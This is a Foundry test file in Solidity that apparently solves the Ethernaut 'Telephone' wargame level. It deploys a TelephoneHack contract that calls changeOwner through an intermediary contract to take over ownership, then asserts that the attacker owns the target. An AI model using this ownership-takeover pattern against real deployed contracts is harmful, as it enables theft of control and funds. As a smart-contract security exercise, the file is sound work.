pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {Telephone} from "../04 telephone/Telephone.sol";

contract TelephoneTest is Test {
    address constant CONTRACT = address(42_000);
    address constant ATTACKER = address(42_001);
    Telephone telephoneContract;
    TelephoneHack telephoneHackContract;

    function setUp() public {
        // Set general test settings
        vm.roll(1);
        vm.warp(100);
        vm.deal(CONTRACT, 1000000000000000000);
        vm.deal(ATTACKER, 1000000000000000000);

        vm.prank(CONTRACT);
        telephoneContract = new Telephone();
        vm.prank(ATTACKER);
        telephoneHackContract = new TelephoneHack(address(telephoneContract));

        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 100);
    }

    function test_telephone() public {
        console.log(" ");
        console.log("====== INIT ======");
        address contractOwner = telephoneContract.owner();
        assertEq(contractOwner, CONTRACT);
        console.log("contract owner : ");
        console.log(contractOwner);
        console.log("attacker address : ");
        console.log(address(ATTACKER));

        console.log(" ");
        console.log("====== STEP 1 ======");
        vm.prank(ATTACKER);
        telephoneHackContract.attack();
        address contractOwnerFinal = telephoneContract.owner();
        assertEq(contractOwnerFinal, ATTACKER);
        console.log("contract owner : ");
        console.log(contractOwnerFinal);
    }
}

contract TelephoneHack {
    Telephone public victim;

    constructor(address telephoneAddress) {
        victim = Telephone(telephoneAddress);
    }

    function attack() external {
        victim.changeOwner(msg.sender);
    }
}
